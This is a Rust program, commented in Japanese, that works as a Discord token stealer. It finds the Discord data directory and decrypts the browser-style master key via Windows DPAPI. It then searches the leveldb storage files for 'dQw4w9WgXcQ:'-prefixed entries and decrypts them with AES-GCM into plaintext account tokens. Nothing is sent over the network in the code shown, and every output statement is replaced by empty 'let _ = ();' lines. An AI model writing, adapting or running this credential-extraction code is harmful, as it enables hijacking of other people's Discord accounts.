use std::{env, fs, path::{Path, PathBuf}, ptr, ffi::c_void};
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use thiserror::Error;
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce
};

// Windows FFI定義
#[link(name = "crypt32")]
unsafe extern "system" {
    fn CryptUnprotectData(
        pDataIn: *const DataBlob,
        ppszDataDescr: *mut *mut u16,
        pOptionalEntropy: *const DataBlob,
        pvReserved: *mut c_void,
        pPromptStruct: *mut c_void,
        dwFlags: u32,
        pDataOut: *mut DataBlob,
    ) -> i32;
}

#[link(name = "kernel32")]
unsafe extern "system" {
    fn LocalFree(hMem: *mut c_void) -> *mut c_void;
}

#[repr(C)]
struct DataBlob {
    cb_data: u32,
    pb_data: *mut u8,
}

const CRYPTPROTECT_UI_FORBIDDEN: u32 = 0x1;

#[derive(Error, Debug)]
pub enum TokenError {
    #[error("DPAPI復号に失敗しました: {message}")]
    DpapiError { message: String },
    
    #[error("ファイル読み込みエラー: {path}")]
    FileReadError { path: String },
    
    #[error("JSON解析エラー: {0}")]
    JsonParseError(#[from] serde_json::Error),
    
    #[error("Base64デコードエラー: {0}")]
    Base64DecodeError(#[from] base64::DecodeError),
    
    #[error("暗号化キーが見つかりません")]
    EncryptedKeyNotFound,
    
    #[error("キーのDPAPIプレフィックスが見つかりません")]
    InvalidKeyFormat,
    
    #[error("AES-GCM復号に失敗しました")]
    AesDecryptionError,
    
    #[error("データフォーマットが無効です (長さ: {length})")]
    InvalidDataFormat { length: usize },
    
    #[error("暗号化トークンが見つかりませんでした")]
    NoTokensFound,
    
    #[error("すべてのトークンの復号に失敗しました")]
    AllDecryptionsFailed,
}

// DPAPIで復号
fn dpapi_unprotect(data: &[u8]) -> Result<Vec<u8>, TokenError> {
    unsafe {
        let in_blob = DataBlob {
            cb_data: data.len() as u32,
            pb_data: data.as_ptr() as *mut u8,
        };
        let mut out_blob = DataBlob {
            cb_data: 0,
            pb_data: ptr::null_mut(),
        };
        
        let result = CryptUnprotectData(
            &in_blob,
            ptr::null_mut(),
            ptr::null(),
            ptr::null_mut(),
            ptr::null_mut(),
            CRYPTPROTECT_UI_FORBIDDEN,
            &mut out_blob,
        );
        
        if result != 0 {
            let slice = std::slice::from_raw_parts(out_blob.pb_data, out_blob.cb_data as usize);
            let decrypted_data = slice.to_vec();
            LocalFree(out_blob.pb_data as *mut c_void);
            Ok(decrypted_data)
        } else {
            Err(TokenError::DpapiError { 
                message: "DPAPI decryption failed".to_string() 
            })
        }
    }
}

// Local StateからAESマスターキーを取り出して復号
fn get_master_key(local_state_path: &Path) -> Result<Vec<u8>, TokenError> {
    let json = fs::read_to_string(local_state_path)
        .map_err(|e| {
            if e.kind() == std::io::ErrorKind::NotFound {
                TokenError::FileReadError { 
                    path: format!("ファイルが見つかりません: {}", local_state_path.display())
                }
            } else {
                TokenError::FileReadError { 
                    path: format!("読み込みエラー: {} ({})", local_state_path.display(), e)
                }
            }
        })?;
    
    let v: serde_json::Value = serde_json::from_str(&json)?;
    let enc_key_b64 = v["os_crypt"]["encrypted_key"]
        .as_str()
        .ok_or(TokenError::EncryptedKeyNotFound)?;
    
    let enc_key = BASE64.decode(enc_key_b64)?;
    
    if !enc_key.starts_with(b"DPAPI") {
        return Err(TokenError::InvalidKeyFormat);
    }
    
    let key = dpapi_unprotect(&enc_key[5..])?;
    Ok(key)
}

// Discordのディレクトリを自動検出
fn find_discord_directory() -> Result<PathBuf, TokenError> {
    // dirs::config_dir()を標準ライブラリで置換
    let roaming = std::env::var("APPDATA")
        .or_else(|_| std::env::var("XDG_CONFIG_HOME"))
        .or_else(|_| std::env::var("HOME").map(|h| format!("{}/.config", h)))
        .map(std::path::PathBuf::from)
        .ok().ok_or(TokenError::FileReadError {
        path: "AppData\\Roamingディレクトリが見つかりません".to_string()
    })?;
    
    let discord_path = roaming.join("discord");
    if !discord_path.exists() {
        return Err(TokenError::FileReadError {
            path: format!("Discordディレクトリが見つかりません: {}", discord_path.display())
        });
    }
    
    Ok(discord_path)
}

// Local Stateファイルを自動検出
fn find_local_state() -> Result<PathBuf, TokenError> {
    let discord_dir = find_discord_directory()?;
    let local_state_path = discord_dir.join("Local State");
    
    if !local_state_path.exists() {
        return Err(TokenError::FileReadError {
            path: format!("Local Stateファイルが見つかりません: {}", local_state_path.display())
        });
    }
    
    Ok(local_state_path)
}

// .ldbファイルを再帰的に検索してすべて取得
fn find_all_ldb_files() -> Result<Vec<PathBuf>, TokenError> {
    let discord_dir = find_discord_directory()?;
    let local_storage_path = discord_dir.join("Local Storage").join("leveldb");
    
    if !local_storage_path.exists() {
        return Err(TokenError::FileReadError {
            path: format!("leveldbディレクトリが見つかりません: {}", local_storage_path.display())
        });
    }
    
    let mut ldb_files = Vec::new();
    collect_ldb_files_recursive(&local_storage_path, &mut ldb_files)?;
    
    if ldb_files.is_empty() {
        return Err(TokenError::FileReadError {
            path: format!(".ldbファイルが見つかりません: {}", local_storage_path.display())
        });
    }
    
    // ファイル名でソート
    ldb_files.sort();
    Ok(ldb_files)
}

// 再帰的にLDBファイルを収集
fn collect_ldb_files_recursive(dir: &PathBuf, ldb_files: &mut Vec<PathBuf>) -> Result<(), TokenError> {
    let entries = fs::read_dir(dir)
        .map_err(|_| TokenError::FileReadError {
            path: format!("ディレクトリの読み取りに失敗: {}", dir.display())
        })?;
    
    for entry in entries {
        let entry = entry.map_err(|_| TokenError::FileReadError {
            path: format!("ディレクトリエントリの読み取りに失敗: {}", dir.display())
        })?;
        
        let path = entry.path();
        
        if path.is_dir() {
            // サブディレクトリを再帰的に検索
            collect_ldb_files_recursive(&path, ldb_files)?;
        } else if path.extension().map_or(false, |ext| ext == "ldb") {
            ldb_files.push(path);
        }
    }
    
    Ok(())
}

// .ldbファイルからトークン候補を手動検索で抽出
fn extract_encrypted_tokens(ldb_data: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let pattern = "dQw4w9WgXcQ:";
    let mut start = 0;
    
    while let Some(pos) = ldb_data[start..].find(pattern) {
        let token_start = start + pos + pattern.len();
        let remaining = &ldb_data[token_start..];
        
        // トークンの終端を探す（非印字文字または特定の区切り文字まで）
        let token_end = remaining
            .find(|c: char| c == '"' || c == '\0' || c == '\n' || c == '\r' || c.is_control())
            .unwrap_or(remaining.len());
        
        if token_end > 0 {
            let token = &remaining[..token_end];
            // Base64っぽい文字列かチェック（最低限の検証）
            if token.len() > 20 && token.chars().all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=') {
                tokens.push(token.to_string());
            }
        }
        
        start = token_start + token_end;
    }
    
    tokens
}

fn decrypt_token(master_key: &[u8], encrypted_b64: &str) -> Result<String, TokenError> {
    let data = BASE64.decode(encrypted_b64)?;
    
    if data.len() < 15 + 16 {
        return Err(TokenError::InvalidDataFormat { 
            length: data.len() 
        });
    }
    
    // v10 (3バイト) + IV(12) + CIPHERTEXT + TAG(16)
    let iv = &data[3..15];
    let ciphertext = &data[15..data.len() - 16];
    let tag = &data[data.len() - 16..];

    let cipher = Aes256Gcm::new_from_slice(master_key)
        .map_err(|_| TokenError::AesDecryptionError)?;
    
    let mut data_all = ciphertext.to_vec();
    data_all.extend_from_slice(tag);
    let nonce = Nonce::from_slice(iv);
    
    let plaintext = cipher.decrypt(nonce, data_all.as_ref())
        .map_err(|_| TokenError::AesDecryptionError)?;
    
    Ok(String::from_utf8_lossy(&plaintext).to_string())
}

fn main() {
    if let Err(e) = run() {
        match e {
            TokenError::FileReadError { path: _ } => {
        let _ = ();
            },
            TokenError::NoTokensFound => {
        let _ = ();
            },
            TokenError::AllDecryptionsFailed => {
        let _ = ();
            },
            _ => {
        let _ = ();
            }
        }
        std::process::exit(1);
    }
}

fn run() -> Result<(), TokenError> {
    let args: Vec<String> = env::args().collect();
    
    // 引数の処理（引数なしの場合は自動検出）
    let (local_state_path, ldb_files) = if args.len() == 1 {
        // 自動検出モード
        let _ = ();
        let _ = ();
        
        let local_state = find_local_state()?;
        let all_ldb_files = find_all_ldb_files()?;
        let _ = ();
        let _ = ();
        let _ = ();
        for (_i, _file) in all_ldb_files.iter().enumerate() {
        let _ = ();
        }
        
        (local_state, all_ldb_files)
    } else if args.len() == 3 {
        // 手動指定モード
        let _ = ();
        let local_state_path = PathBuf::from(&args[1]);
        let ldb_path = PathBuf::from(&args[2]);

        // ファイル存在確認
        if !local_state_path.exists() {
            return Err(TokenError::FileReadError { 
                path: format!("ファイルが見つかりません: {}", local_state_path.display())
            });
        }
        
        if !ldb_path.exists() {
            return Err(TokenError::FileReadError { 
                path: format!("ファイルが見つかりません: {}", ldb_path.display())
            });
        }
        
        (local_state_path, vec![ldb_path])
    } else {
        let _ = ();
        let _ = ();
        let _ = ();
        let _ = ();
        return Ok(());
    };

    // マスターキー取得
        let _ = ();
    let master_key = match get_master_key(&local_state_path) {
        Ok(key) => {
        let _ = ();
            key
        },
        Err(e) => {
        let _ = ();
            return Err(e);
        }
    };
    
    // 全LDBファイルを処理
        let _ = ();
    
    let mut total_count = 0;
    let mut all_tokens = Vec::new();
    
    for (_file_idx, ldb_path) in ldb_files.iter().enumerate() {
        let _ = ();
        
        // .ldb読み込み
        let ldb_bin = match fs::read(ldb_path) {
            Ok(data) => data,
            Err(_) => {
        let _ = ();
                continue;
            }
        };
        let ldb_raw = String::from_utf8_lossy(&ldb_bin);

        // トークン候補抽出
        let tokens_enc = extract_encrypted_tokens(&ldb_raw);
        
        if tokens_enc.is_empty() {
        let _ = ();
            continue;
        }
        let _ = ();

        let mut _file_count = 0;
        
        for (_i, enc) in tokens_enc.iter().enumerate() {
            match decrypt_token(&master_key, enc) {
                Ok(token) => {
        let _ = ();
                    all_tokens.push(token.clone());
                    _file_count += 1;
                    total_count += 1;
                },
                Err(_e) => {
        let _ = ();
                }
            }
        }
        let _ = ();
    }
    
    // 最終結果
        let _ = ();
        let _ = ();
    
    if !all_tokens.is_empty() {
        let _ = ();
        let mut unique_tokens: Vec<_> = all_tokens.into_iter().collect();
        unique_tokens.sort();
        unique_tokens.dedup();
        
        for (_i, _token) in unique_tokens.iter().enumerate() {
        let _ = ();
        }
        let _ = ();
    }
    
    if total_count == 0 {
        return Err(TokenError::AllDecryptionsFailed);
    }
    
    Ok(())
}
